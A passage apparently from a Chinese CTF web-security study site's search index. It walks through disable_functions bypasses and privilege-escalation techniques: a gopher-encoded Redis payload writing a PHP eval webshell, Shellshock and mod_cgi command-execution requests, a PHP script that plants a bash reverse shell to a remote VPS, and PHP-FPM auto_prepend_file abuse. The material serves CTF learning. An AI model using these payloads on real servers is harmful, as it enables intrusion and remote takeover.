\u63a7\u5236\u76ee\u6807\u670d\u52a1\u8bf7\u6c42 Redis\uff08\u901a\u5e38\u4f7f\u7528 <code>gopher://</code> \u534f\u8bae\uff0c\u53ef\u4ee5\u4f2a\u9020 TCP payload\uff09 \u7b2c\u4e8c\u6b65 \u5411 Redis \u53d1\u9001\u5199\u5165\u547d\u4ee4\uff0c\u4fee\u6539\u5176\u914d\u7f6e\uff0c\u5982 <code>dir</code> \u548c <code>dbfilename</code> \u7b2c\u4e09\u6b65 \u5411 Redis \u5199\u5165 \u6076\u610f SSH \u516c\u94a5 \u6216 \u8ba1\u5212\u4efb\u52a1\u811a\u672c \u5230 Web \u6839\u76ee\u5f55\u6216 <code>.ssh/authorized_keys</code> \u7b2c\u56db\u6b65 \u89e6\u53d1 Redis \u4fdd\u5b58\uff08<code>SAVE</code>\uff09\uff0c\u5c06 payload \u5199\u5165\u78c1\u76d8\uff0c\u9020\u6210\u4efb\u610f\u4ee3\u7801\u6267\u884c\u6216\u63d0\u6743 <p>\u672c\u9898\u4f9d\u7136\u53ef\u4ee5\u4f7f\u7528 gopherus \u5b9e\u65bd\u653b\u51fb</p> <p></p> <p>\u518d URL \u7f16\u7801\u4e00\u6b21</p> <pre><code>gopher%3A//127.0.0.1%3A6379/_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252432%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527c%2527%255D%2529%253B%2520%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A/var/www/html%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A\n</code></pre> <p></p>"},{"location":"Web/Chapter6/6-35/","title":"Shellshock \u63d0\u6743","text":""},{"location":"Web/Chapter6/6-35/#shellshock-\u63d0\u6743","title":"Shellshock \u63d0\u6743","text":"<p>\u6f0f\u6d1e\u672c\u8d28</p> <p>Bash \u5728\u5904\u7406 \u201c\u51fd\u6570\u5b9a\u4e49\u201d \u7684\u73af\u5883\u53d8\u91cf\u65f6\u4f1a**\u7ee7\u7eed\u6267\u884c\u51fd\u6570\u4f53\u540e\u591a\u4f59\u7684\u5b57\u7b26\u4e32\u5185\u5bb9**\uff0c\u5373\u4f7f\u5b83\u4e0d\u662f\u5408\u6cd5\u7684\u51fd\u6570\u5b9a\u4e49</p> <p>\u2705 1. \u6b63\u5e38\u7684\u51fd\u6570\u73af\u5883\u53d8\u91cf\u884c\u4e3a\uff08\u793a\u4f8b\uff09</p> <pre><code>env 'foo=() { echo hello; }' bash -c \"echo done\"\n\n# `foo` \u88ab\u5b9a\u4e49\u6210\u4e00\u4e2a\u51fd\u6570\uff0cBash \u4f1a\u6b63\u5e38\u8bc6\u522b\u5b83\n</code></pre> <p>\u274c 2. \u6f0f\u6d1e\u89e6\u53d1\u793a\u4f8b\uff08Shellshock Payload\uff09</p> <pre><code>env 'foo=() { :;}; echo vulnerable' bash -c \"echo test\"\n\n# foo=() { :;}; echo vulnerable \u770b\u8d77\u6765\u50cf\u4e00\u4e2a\u51fd\u6570\u5b9a\u4e49\uff1a\n    # foo=() { :;} \u662f\u5408\u6cd5\u51fd\u6570\u5b9a\u4e49\uff08:; \u662f NOP\uff09\n    # \u4f46\u540e\u7eed\u8ddf\u7740 ; echo vulnerable\uff0c\u5374\u88ab Bash \u8bef\u5f53\u4f5c\u8981\u6267\u884c\u7684\u4ee3\u7801\n# bash -c \"echo test\" \u672c\u610f\u662f\u6267\u884c echo test\uff0c\u4f46\u7531\u4e8e Bash \u89e3\u6790 foo \u65f6\u201c\u9644\u5e26\u6267\u884c\u201d\u4e86 echo vulnerable \n</code></pre> <pre><code># \u8f93\u51fa\nvulnerable\ntest\n</code></pre> <p>\u7f51\u9875\u7ed9\u51fa\u4e86\u540e\u95e8\u5bc6\u7801</p> <p></p> <p>\u8681\u5251\u76f4\u63a5\u8fde\u63a5</p> <p></p> <p>\u6784\u9020 RCE \u4ee3\u7801\uff0c\u53c2\u8003\u535a\u5ba2</p> <pre><code>&lt;?php\n   # putenv() \u7528\u4e8e\u8bbe\u7f6e\u73af\u5883\u53d8\u91cf\n   putenv(\"PHP_test=() { :; }; tac /flag &gt;&gt; /var/www/html/a1andns\");\n   error_log(\"admin\",1);\u3002\n   echo 'ok';// \u4fbf\u4e8e\u5224\u65ad\u662f\u5426\u8fd0\u884c\u6210\u529f\n?&gt;\n</code></pre> <p>\u53f3\u952e\u4e0a\u4f20\u6587\u4ef6</p> <p></p> <p>\u6d4f\u89c8\u5668\u8bbf\u95ee\u51fa\u73b0 OK</p> <p></p> <p></p>"},{"location":"Web/Chapter6/6-36/","title":"Apache Mod CGI \u63d0\u6743","text":""},{"location":"Web/Chapter6/6-36/#apache-mod-cgi-\u63d0\u6743","title":"Apache Mod CGI \u63d0\u6743","text":"<p>\u5f53 Apache \u914d\u7f6e\u4e2d\u542f\u7528\u4e86\u4ee5\u4e0b\u5185\u5bb9\u65f6\uff1a</p> <pre><code>&lt;Directory /&gt;\n    # \u8868\u793a\u5141\u8bb8\u6240\u6709\u7528\u6237\uff08\u5305\u62ec\u533f\u540d\u7528\u6237\uff09\u8bbf\u95ee\u6b64\u76ee\u5f55\u53ca\u5176\u5b50\u76ee\u5f55\uff0c\u6ca1\u6709\u4efb\u4f55\u9650\u5236\n    Require all granted\n&lt;/Directory&gt;\n</code></pre> <p>\u518d\u914d\u5408 <code>mod_cgi</code> \u6a21\u5757\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u6784\u9020\u7279\u6b8a\u7684 URL \u8bf7\u6c42\uff0c\u5982\uff1a</p> <pre><code>GET /cgi-bin/.%2e/.%2e/bin/sh HTTP/1.1\nHost: victim.com\n</code></pre> <p><code>%2e</code> \u662f URL \u7f16\u7801\u7684 <code>.</code>\uff0c\u8fd9\u5bfc\u81f4\u8def\u5f84\u89e3\u6790\u51fa\u9519\uff0c\u7ed5\u8fc7\u4e86\u9650\u5236</p> <p>\u5229\u7528\u8be5\u8def\u5f84\u8bbf\u95ee\u7cfb\u7edf\u4e2d\u7684 <code>sh</code> \u6216\u5176\u4ed6\u89e3\u91ca\u5668\uff0c\u9644\u5e26\u53c2\u6570\u6765\u6267\u884c\u4efb\u610f\u547d\u4ee4</p> <p>\u4f8b\u5982\uff1a</p> <pre><code>POST /cgi-bin/.%2e/.%2e/bin/sh HTTP/1.1\nHost: vulnerable.com\nContent-Length: 46\nContent-Type: application/x-www-form-urlencoded\n\necho; echo \"Content-Type: text/plain\"; echo; id\n</code></pre> <p>\u8f93\u51fa\u5c06\u662f CGI \u54cd\u5e94\u4e2d\u7684\u7528\u6237\u8eab\u4efd\uff0c\u5373\u5df2\u6267\u884c\u7cfb\u7edf\u547d\u4ee4</p> <p>\u5f53\u4f60\u5728 <code>php.ini</code> \u4e2d\u914d\u7f6e\uff1a</p> <pre><code>disable_functions = system, exec, shell_exec, passthru\n</code></pre> <p>\u8fd9\u53ea\u662f\u8ba9 PHP \u89e3\u91ca\u5668\u5728\u8fd0\u884c <code>.php</code> \u811a\u672c\u65f6**\u4e0d\u5141\u8bb8\u8c03\u7528\u8fd9\u4e9b\u51fd\u6570**\uff0c\u9632\u6b62 PHP \u4ee3\u7801\u6267\u884c\u7cfb\u7edf\u547d\u4ee4</p> <p>\u26a0\ufe0f \u4f46\u524d\u63d0\u662f\u2014\u2014\u5fc5\u987b\u901a\u8fc7 PHP \u6765\u8fd0\u884c\u7684\u4ee3\u7801\u624d\u4f1a\u53d7\u8fd9\u4e2a\u914d\u7f6e\u9650\u5236</p> <p>\u5f53\u4f60\u542f\u7528\u4e86 Apache \u7684 <code>mod_cgi</code> \u6a21\u5757\u540e\uff0c\u5b83\u7684\u5de5\u4f5c\u65b9\u5f0f\u662f\uff1a</p> <ul> <li>\u7528\u6237\u8bf7\u6c42 <code>example.com/cgi-bin/exploit.sh</code></li> <li>Apache \u68c0\u67e5\u8be5\u6587\u4ef6\u662f\u53ef\u6267\u884c\u6587\u4ef6\uff08\u6bd4\u5982 <code>/bin/sh</code> \u811a\u672c\uff09</li> <li>Apache \u542f\u52a8\u65b0\u5b50\u8fdb\u7a0b\uff0c\u76f4\u63a5\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u8fd0\u884c\u8be5\u811a\u672c\uff08\u4e0d\u662f\u4ea4\u7ed9 PHP\uff09</li> </ul> <p>\u8fd9\u65f6\uff0c\u4e0d\u4f1a\u52a0\u8f7d PHP\uff0c\u4e5f\u4e0d\u4f1a\u6267\u884c <code>php.ini</code> \u7684\u914d\u7f6e\u903b\u8f91</p> <pre><code>\u6b63\u5e38 PHP RCE \u60c5\u51b5\u4e0b\uff1a\n\u6d4f\u89c8\u5668 --&gt; Apache --&gt; PHP --&gt; \u4f60\u7684\u811a\u672c\n                            |\n                            \u2514\u2192 system(), \u88ab disable_functions \u7981\u7528\n\n\u800c mod_cgi \u60c5\u51b5\u4e0b\uff1a\n\u6d4f\u89c8\u5668 --&gt; Apache --&gt; \u76f4\u63a5\u6267\u884c /bin/sh\uff08\u7ed5\u8fc7 PHP\uff09\n                        |\n                        \u2514\u2192 \u4efb\u610f\u547d\u4ee4\u88ab\u6267\u884c\uff08\u65e0\u4efb\u4f55\u8bed\u8a00\u7ea7\u9650\u5236\uff09\n</code></pre> <p>\u70b9\u51fb\u91cd\u7f6e\u540e\u95e8\u76ee\u5f55</p> <p></p> <p>\u70b9\u51fb GetFlag \u8fdb\u5165\u5230\u540e\u95e8\uff0c\u9ed8\u8ba4 index.php</p> <p></p> <p>\u53f3\u952e\u63d2\u4ef6\u9009\u62e9\u597d\u5bf9\u5e94\u7684\u6a21\u5f0f</p> <p></p> <p>\u70b9\u51fb\u5f00\u59cb\u540e\u5982\u679c\u6761\u4ef6\u6ca1\u95ee\u9898\u5c31\u4f1a\u5f39\u7ec8\u7aef\u51fa\u6765</p> <p></p> <p></p> <p>\u624b\u52a8\u7684\u8bdd\u9700\u8981\u5148\u4e0a\u4f20\u4e00\u4e2a <code>.htaccess</code> \u6587\u4ef6\uff0c\u53c2\u8003\u535a\u5ba2</p> <pre><code># \u5141\u8bb8\u5f53\u524d\u76ee\u5f55\u4e2d\u7684 CGI\uff08Common Gateway Interface\uff09\u811a\u672c\u88ab\u6267\u884c\nOptions +ExecCGI\n\n# \u5c06\u6240\u6709\u4ee5 .eddie \u7ed3\u5c3e\u7684\u6587\u4ef6\u89c6\u4e3a CGI \u811a\u672c\uff08\u53ef\u6267\u884c\u6587\u4ef6\uff09\n# \u5373\u7528\u6237\u8bbf\u95ee example.com/script.eddie \u65f6\uff0cApache \u4f1a\u5c1d\u8bd5\u6267\u884c\u5b83\u800c\u4e0d\u662f\u5f53\u4f5c\u666e\u901a\u6587\u4ef6\u8f93\u51fa\nAddHandler cgi-script .eddie\n</code></pre> <p>\u53cd\u5f39 shell \u7684 <code>shell.eddie</code> \u6587\u4ef6</p> <pre><code>#!/bin/bash\n# \u8f93\u51fa HTTP \u54cd\u5e94\u5934\uff0c\u544a\u77e5\u6d4f\u89c8\u5668\u8fd9\u662f HTML \u5185\u5bb9\necho -ne \"Content-Type: text/html\\n\\n\"\n\n# \u6267\u884c ls \u547d\u4ee4\u5217\u51fa\u5f53\u524d\u76ee\u5f55\uff0c\u5e76\u7528 echo \u8f93\u51fa\necho &amp;&amp; ls\n</code></pre> <p><code>eddie.php</code> \u6587\u4ef6</p> <pre><code>&lt;?php\n// \u8981\u6267\u884c\u7684\u53cd\u5f39 shell \u547d\u4ee4\uff08\u5c06 bash shell \u8fde\u63a5\u5230\u8fdc\u7a0b VPS \u7684\u6307\u5b9a\u7aef\u53e3\uff09\n$cmd = \"bash -i &gt;&amp; /dev/tcp/vps/port 0&gt;&amp;1\";\n\n// \u521b\u5efa CGI \u811a\u672c\u7684\u5185\u5bb9\uff08bash \u811a\u672c\uff09\n$shellfile = \"#!/bin/bash\\n\"; // \u6307\u5b9a\u4f7f\u7528 bash \u89e3\u91ca\u5668\n$shellfile .= \"echo -ne \\\"Content-Type: text/html\\\\n\\\\n\\\"\\n\"; // \u8f93\u51fa HTTP \u54cd\u5e94\u5934\uff0c\u9632\u6b62\u670d\u52a1\u5668\u629b\u51fa 500 \u9519\u8bef\n$shellfile .= \"$cmd\"; // \u6dfb\u52a0\u53cd\u5f39 shell \u547d\u4ee4\u5230\u811a\u672c\u4e2d\n\n// \u8f93\u51fa\u68c0\u67e5\u7ed3\u679c\u7684\u51fd\u6570\uff08\u662f\u5426\u6ee1\u8db3\u6761\u4ef6\uff09\nfunction checkEnabled($text, $condition, $yes, $no)\n{\n    echo \"$text: \" . ($condition ? $yes : $no) . \"&lt;br&gt;\\n\"; // \u6839\u636e\u6761\u4ef6\u8f93\u51fa\u7ed3\u679c\n}\n\n// \u5982\u679c\u6ca1\u6709\u8bbe\u7f6e ?checked=true \u53c2\u6570\uff0c\u5219\u9996\u6b21\u8bbf\u95ee\u65f6\u8fdb\u5165\u8be5\u5206\u652f\nif (!isset($_GET['checked']))\n{\n    // \u5411\u5f53\u524d\u76ee\u5f55\u4e0b\u7684 .htaccess \u6587\u4ef6\u6dfb\u52a0\u4e00\u884c SetEnv \u6307\u4ee4\uff08\u68c0\u6d4b\u662f\u5426\u5141\u8bb8\u4f7f\u7528 .htaccess\uff09\n    @file_put_contents('.htaccess', \"\\nSetEnv HTACCESS on\", FILE_APPEND);\n\n    // \u91cd\u5b9a\u5411\u5230\u81ea\u8eab\uff0c\u52a0\u4e0a ?checked=true \u53c2\u6570\uff0c\u8fdb\u5165\u4e0b\u4e00\u9636\u6bb5\u68c0\u6d4b\n    header('Location: ' . $_SERVER['PHP_SELF'] . '?checked=true');\n}\nelse\n{\n    // \u68c0\u67e5\u670d\u52a1\u5668\u662f\u5426\u542f\u7528\u4e86 mod_cgi \u6a21\u5757\n    $modcgi = in_array('mod_cgi', apache_get_modules());\n\n    // \u68c0\u67e5\u5f53\u524d\u76ee\u5f55\u662f\u5426\u6709\u5199\u6743\u9650\n    $writable = is_writable('.');\n\n    // \u68c0\u67e5 .htaccess \u6587\u4ef6\u662f\u5426\u751f\u6548\uff08\u901a\u8fc7\u524d\u9762\u5199\u5165\u7684 SetEnv \u51b3\u5b9a\uff09\n    $htaccess = !empty($_SERVER['HTACCESS']);\n\n    // \u663e\u793a\u4e09\u4e2a\u6761\u4ef6\u7684\u68c0\u6d4b\u7ed3\u679c\n    checkEnabled(\"Mod-Cgi \u662f\u5426\u542f\u7528\", $modcgi, \"\u662f\", \"\u5426\");\n    checkEnabled(\"\u5f53\u524d\u76ee\u5f55\u662f\u5426\u53ef\u5199\", $writable, \"\u662f\", \"\u5426\");\n    checkEnabled(\".htaccess \u662f\u5426\u751f\u6548\", $htaccess, \"\u662f\", \"\u5426\");\n\n    // \u5982\u679c\u6709\u4efb\u4e00\u6761\u4ef6\u4e0d\u6ee1\u8db3\uff0c\u5219\u9000\u51fa\u6267\u884c\n    if (!($modcgi &amp;&amp; $writable &amp;&amp; $htaccess))\n    {\n        echo \"\u9519\u8bef\uff1a\u4e0a\u8ff0\u6240\u6709\u6761\u4ef6\u90fd\u5fc5\u987b\u6ee1\u8db3\u811a\u672c\u624d\u53ef\u5de5\u4f5c\uff01\";\n    }\n    else\n    {\n        // \u5907\u4efd .htaccess \u6587\u4ef6\uff08\u4ee5\u9632\u51fa\u9519\uff09\n        checkEnabled(\"\u5907\u4efd .htaccess \u6587\u4ef6\", copy(\".htaccess\", \".htaccess.bak\"), \"\u6210\u529f\uff01\u5df2\u4fdd\u5b58\u4e3a .htaccess.bak\", \"\u5931\u8d25\uff01\");\n\n        // \u5199\u5165\u65b0\u7684 .htaccess \u5185\u5bb9\uff1a\u542f\u7528 ExecCGI\uff0c\u5e76\u5c06 .dizzle \u540e\u7f00\u5f53\u4f5c CGI \u811a\u672c\u5904\u7406\n        checkEnabled(\"\u5199\u5165 .htaccess \u6587\u4ef6\", file_put_contents('.htaccess', \"Options +ExecCGI\\nAddHandler cgi-script .dizzle\"), \"\u6210\u529f\uff01\", \"\u5931\u8d25\uff01\");\n\n        // \u5199\u5165\u53cd\u5f39 shell \u811a\u672c\uff0c\u6269\u5c55\u540d\u4e3a .dizzle\uff08\u4fbf\u4e8e\u4f2a\u88c5\u6216\u7ed5\u8fc7\u4e0a\u4f20\u9650\u5236\uff09\n        checkEnabled(\"\u5199\u5165 shell \u6587\u4ef6\", file_put_contents('shell.dizzle', $shellfile), \"\u6210\u529f\uff01\", \"\u5931\u8d25\uff01\");\n\n        // \u5c06 shell.dizzle \u6587\u4ef6\u8bbe\u7f6e\u4e3a 777 \u6743\u9650\uff08\u53ef\u6267\u884c\uff09\n        checkEnabled(\"\u8bbe\u7f6e\u6743\u9650\u4e3a 777\", chmod(\"shell.dizzle\", 0777), \"\u6210\u529f\uff01\", \"\u5931\u8d25\uff01\");\n\n        // \u89e6\u53d1 shell \u811a\u672c\u7684\u6267\u884c\uff08\u901a\u8fc7 img \u6807\u7b7e\u52a0\u8f7d shell.dizzle\uff0c\u4f46\u4e0d\u663e\u793a\uff09\n        echo \"\u6b63\u5728\u6267\u884c\u811a\u672c\uff0c\u8bf7\u68c0\u67e5\u4f60\u7684\u76d1\u542c\u7aef\u53e3 &lt;img src='shell.dizzle' style='display:none;'&gt;\";\n    }\n}\n?&gt;\n</code></pre> <p>\u6254\u5230 <code>backdoor</code> \u76ee\u5f55\u4e0b\u9762\uff0c\u518d\u76f4\u63a5\u8bbf\u95ee <code>eddie.php</code></p> <p>\u4f1a\u5728\u76ee\u5f55\u4e0b\u751f\u6210 <code>shell.dizzle</code>\uff0c\u518d\u8bbf\u95ee <code>shell.dizzle</code> \u5c31\u53ef\u4ee5\u6210\u529f\u53cd\u5f39 shell</p> <p></p> <p>\u8bbf\u95ee <code>eddie.php</code></p> <p></p> <p>\u8681\u5251\u4e2d\u5237\u65b0\u76ee\u5f55\u53ef\u4ee5\u770b\u5230\u6267\u884c\u6210\u529f\uff0c\u591a\u51fa\u4e24\u4e2a\u6587\u4ef6</p> <p></p> <p></p>"},{"location":"Web/Chapter6/6-37/","title":"PHP-FPM \u63d0\u6743","text":""},{"location":"Web/Chapter6/6-37/#php-fpm-\u63d0\u6743","title":"PHP-FPM \u63d0\u6743","text":"<p>PHP-FPM\uff08FastCGI Process Manager\uff09\u662f PHP \u7684\u4e00\u79cd\u8fd0\u884c\u65b9\u5f0f\uff0c\u4e13\u95e8\u7528\u6765\u63d0\u9ad8 PHP \u5728\u9ad8\u5e76\u53d1 Web \u73af\u5883\u4e2d\u7684\u6027\u80fd\u548c\u7a33\u5b9a\u6027</p> <p>\u5b83\u8d1f\u8d23 \u7ba1\u7406\u591a\u4e2a PHP \u8fdb\u7a0b\uff0c\u63a5\u6536 Web \u670d\u52a1\u5668\uff08\u5982 Nginx\uff09\u53d1\u6765\u7684\u8bf7\u6c42\uff0c\u4ea4\u7ed9 PHP \u89e3\u6790\uff0c\u7136\u540e\u628a\u7ed3\u679c\u8fd4\u56de\u7ed9 Web \u670d\u52a1\u5668</p> <pre><code>\u7528\u6237\u6d4f\u89c8\u5668\n     \u2193\n   Nginx\n     \u2193 FastCGI\uff08\u901a\u8fc7 Unix socket \u6216 TCP\uff09\n PHP-FPM\n     \u2193\n   PHP\u4ee3\u7801\n</code></pre> <p>\u914d\u7f6e\u6587\u4ef6\u4f4d\u7f6e</p> <pre><code>/etc/php/7.x/fpm/php-fpm.conf\n/etc/php/7.x/fpm/pool.d/www.conf\n</code></pre> <p>\u6b63\u5e38\u7684\u8bbf\u95ee\u6d41\u7a0b\u662f\uff1a\u6d4f\u89c8\u5668 \u2192 Nginx\uff08\u6216 Apache\uff09 \u2192 PHP-FPM \u2192 \u6267\u884c PHP \u6587\u4ef6</p> <p>\u5982\u679c\u6211\u4eec\u77e5\u9053 PHP-FPM \u662f\u76d1\u542c\u5728 9000 \u7aef\u53e3\uff08\u9ed8\u8ba4\uff09\uff0c\u800c\u4e14 Web \u670d\u52a1\u5668\u6ca1\u6709\u52a0\u9650\u5236\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5**\u7ed5\u8fc7 Nginx\uff0c\u76f4\u63a5\u7528 FastCGI \u534f\u8bae\u548c FPM \u901a\u4fe1**\uff0c\u5c31\u50cf\u6a21\u62df\u201cWeb \u670d\u52a1\u5668\u201d\u4e00\u6837\uff0c\u76f4\u63a5\u8ba9 FPM \u6267\u884c PHP \u6587\u4ef6</p> <p>\u524d\u63d0\u6761\u4ef6\u5982\u4e0b\uff1a</p> <p>\u2705 \u7b2c\u4e00\uff1a\u4f60\u5f97\u6307\u5b9a\u4e00\u4e2a\u201c\u5b58\u5728\u201d\u7684 PHP \u6587\u4ef6\uff08\u901a\u8fc7  <code>SCRIPT_FILENAME</code>\uff09</p> <p>\u56e0\u4e3a FPM \u63a5\u6536\u8bf7\u6c42\u65f6\uff0c\u9700\u8981\u4f60\u544a\u8bc9\u5b83\uff1a\u8981\u6267\u884c\u54ea\u4e2a PHP \u6587\u4ef6\uff1f</p> <p>\u8fd9\u5c31\u662f <code>SCRIPT_FILENAME</code> \u53c2\u6570\u7684\u4f5c\u7528</p> <ul> <li>\u5982\u679c\u8fd9\u4e2a\u53c2\u6570\u6307\u5411\u7684\u6587\u4ef6\u4e0d\u5b58\u5728\uff0cFPM \u5c31\u76f4\u63a5\u8fd4\u56de 404</li> <li>\u6240\u4ee5\u4f60\u5fc5\u987b\u627e\u5230\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u5df2\u7ecf\u5b58\u5728\u7684 PHP \u6587\u4ef6</li> </ul> <p>\ud83d\udca1\u6280\u5de7\uff1a</p> <p>\u6709\u65f6\u5019\u670d\u52a1\u5668\u4e0a\u4f1a\u9884\u88c5\u4e00\u4e9b PHP \u793a\u4f8b\u6587\u4ef6\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u8fd9\u4e9b</p> <p>\u2705 \u7b2c\u4e8c\uff1a\u53ea\u80fd\u6267\u884c\u8fd9\u4e2a PHP \u6587\u4ef6\uff1f\u4e0d\u80fd\u8fd0\u884c\u4efb\u610f\u4ee3\u7801\uff1f</p> <p>\u5c31\u7b97\u4f60\u80fd\u63a7\u5236  <code>SCRIPT_FILENAME</code>\uff0c\u4e5f\u53ea\u80fd\u6267\u884c\u670d\u52a1\u5668\u4e0a\u5df2\u6709\u7684 PHP \u6587\u4ef6**</p> <p>\u90a3\u5982\u4f55\u5b9e\u73b0\u201c\u6267\u884c\u4efb\u610f\u4ee3\u7801\u201d\u5462\uff1f</p> <p>\u53ef\u4ee5\u5229\u7528 PHP \u7684\u914d\u7f6e\u9879\uff1a<code>auto_prepend_file</code>\u3002</p> <p>\ud83d\ude80 <code>auto_prepend_file</code> \u662f\u4ec0\u4e48\uff1f</p> <p>\u8fd9\u4e2a\u914d\u7f6e\u9879\u53ef\u4ee5\u8ba9\u4f60\u5728\u6267\u884c\u76ee\u6807 PHP \u6587\u4ef6\u524d\uff0c\u81ea\u52a8\u5305\u542b\uff08include\uff09\u4e00\u4e2a\u4f60\u6307\u5b9a\u7684\u6587\u4ef6</p> <p>\u5982\u679c\u6211\u4eec\u8bbe\u7f6e\u5b83\u4e3a\uff1a<code>php://input</code>\uff0c\u90a3\u5c31\u8868\u793a\u2014\u2014</p> <p>\u5728\u6267\u884c\u76ee\u6807\u6587\u4ef6\u524d\uff0c\u5148\u6267\u884c\u6211\u4eec POST \u8fdb\u6765\u7684 PHP \u4ee3\u7801\uff01\u8fd9\u5c31\u76f8\u5f53\u4e8e\u8fdc\u7a0b\u6267\u884c\u4e86\u4efb\u610f\u4ee3\u7801</p> <p>\u2705 \u7b2c\u4e09\uff1aPHP \u9ed8\u8ba4\u7981\u6b62\u4e86\u8fd9\u79cd\u7528\u6cd5\uff0c\u600e\u4e48\u529e\uff1f</p> <p>PHP \u6709\u4e00\u4e2a\u914d\u7f6e\u53eb\uff1a</p> <pre><code>allow_url_include = Off\n</code></pre> <p>\u5982\u679c\u5b83\u662f  <code>Off</code>\uff0c\u4f60\u5c31\u4e0d\u80fd\u7528  <code>php://input</code>  \u6216\u8fdc\u7a0b URL \u505a include</p> <p>\ud83e\udd2f \u89e3\u51b3\u529e\u6cd5\uff1a</p> <p>FastCGI \u534f\u8bae\u91cc\u6709\u4e24\u4e2a\u5173\u952e\u5b57\u6bb5\uff1a</p> <ul> <li><code>PHP_VALUE</code>\uff1a\u8bbe\u7f6e\u666e\u901a\u7684 php.ini \u914d\u7f6e\u9879</li> <li><code>PHP_ADMIN_VALUE</code>\uff1a\u8bbe\u7f6e\u4e00\u4e9b\u9ad8\u7ea7\uff08\u53d7\u9650\u5236\uff09\u7684 php.ini \u914d\u7f6e\u9879</li> </ul> <p>\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u5728 FastCGI \u8bf7\u6c42\u4e2d\u8bbe\u7f6e\uff1a</p> <pre><code>PHP_VALUE: allow_url_include=On\n</code></pre> <p>\u518d\u52a0\u4e0a\uff1a</p> <pre><code>PHP_VALUE: auto_prepend_file=php://input\n</code></pre> <p>\u8fd9\u6837\uff0cPHP \u5c31\u4f1a\u5728\u6267\u884c\u524d**\u81ea\u52a8\u6267\u884c\u6211\u4eec\u6784\u9020\u7684 payload**\uff0c\u4ece\u800c\u5b9e\u73b0\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c</p> <p>\u5728\u8681\u5251\u4e2d FPM/FCGI \u5730\u5740\u8fd9\u91cc localhost \u548c 127.0.0.1 \u90fd\u8bd5\u4e00\u8bd5</p> <p></p> <p>\u8fde\u63a5\u65b0\u7684\u6728\u9a6c</p> <p></p>"},{"location":"Web/Chapter6/6-38/","title":"GC UAF \u63d0\u6743","text":""},{"location":"Web/Chapter6/6-38/#gc-uaf-\u63d0\u6743","title":"GC UAF \u63d0\u6743","text":"<p>GC\uff08Garbage Collection\uff09\u673a\u5236</p> <ul> <li>PHP \u7684 GC \u673a\u5236\u4e3b\u8981\u5904\u7406\u5faa\u73af\u5f15\u7528\u7684\u5185\u5b58\u91ca\u653e</li> <li>\u5f53\u5bf9\u8c61\u4e4b\u95f4\u5b58\u5728\u5faa\u73af\u5f15\u7528\u65f6\uff0c\u6b63\u5e38\u7684\u5f15\u7528\u8ba1\u6570\u65e0\u6cd5\u91ca\u653e\u8fd9\u4e9b\u5bf9\u8c61\uff0cGC \u4f1a\u68c0\u6d4b\u5e76\u56de\u6536</li> <li>\u5728 PHP 5.3+ \u5f15\u5165\u7684 \u5468\u671f\u6027\u5783\u573e\u6536\u96c6\u5668\uff08Cycle Collector\uff09\u5904\u7406\u8fd9\u7c7b\u95ee\u9898</li> </ul> <p>\u7b2c\u4e00\u6b65\uff1a\u5236\u9020 UAF \u573a\u666f</p> <p>\u901a\u8fc7\u521b\u5efa\u4e00\u7ec4\u5b58\u5728\u5faa\u73af\u5f15\u7528\u7684\u5bf9\u8c61\uff0c\u6bd4\u5982\uff1a</p> <pre><code>class A {\n    public $ref;\n}\n$a = new A();\n$b = new A();\n$a-&gt;ref = $b;\n$b-&gt;ref = $a;\n</code></pre> <p>\u7136\u540e\u53d6\u6d88\u5f15\u7528\uff1a</p> <pre><code>unset($a, $b);\n</code></pre> <p>\u8fd9\u65f6\u5019\uff0c\u4e24\u4e2a\u5bf9\u8c61\u5f62\u6210\u7684\u5faa\u73af\u5f15\u7528\u4f1a\u88ab\u653e\u5165 GC roots \u4e2d\u7b49\u5f85\u6e05\u7406</p> <p>\u5f53 GC \u6e05\u7406\u8fd9\u4e9b\u5bf9\u8c61\u65f6\uff0c\u5982\u679c\u5176\u4e2d\u67d0\u4e2a\u5bf9\u8c61\u7684 <code>__destruct()</code> \u65b9\u6cd5\u8bbf\u95ee\u4e86\u53e6\u4e00\u4e2a\u5df2\u88ab\u91ca\u653e\u7684\u5bf9\u8c61\uff0c\u5c31\u4f1a\u89e6\u53d1 UAF</p> <p>\u7b2c\u4e8c\u6b65\uff1a\u5e03\u7f6e\u6076\u610f\u7684\u6790\u6784\u65b9\u6cd5</p> <p>\u5728\u67d0\u4e2a\u5bf9\u8c61\u7684 <code>__destruct()</code> \u65b9\u6cd5\u4e2d\u8c03\u7528 \u52a8\u6001\u65b9\u6cd5\u6216\u9b54\u672f\u65b9\u6cd5\uff0c\u5e76\u8bd5\u56fe\u63a7\u5236\u6267\u884c\u6d41\u7a0b\uff1a</p> <pre><code>class Exploit {\n    function __destruct() {\n        global $evil_payload;\n        call_user_func($evil_payload);\n    }\n}\n</code></pre> <p>\u5728 GC \u56de\u6536\u9636\u6bb5\uff0c\u8be5\u65b9\u6cd5\u4f1a\u88ab\u8c03\u7528</p> <p>\u7b2c\u4e09\u6b65\uff1a\u5185\u5b58\u91cd\u7528 &amp; \u6f0f\u6d1e\u89e6\u53d1</p> <p>\u56e0\u4e3a PHP \u5728\u91ca\u653e\u5185\u5b58\u540e\u5e76\u4e0d\u4f1a\u7acb\u5373\u6e05\u96f6\uff0c\u4e0b\u6b21\u5206\u914d\u53ef\u80fd\u4f1a\u590d\u7528\u8be5\u5185\u5b58\u5757</p> 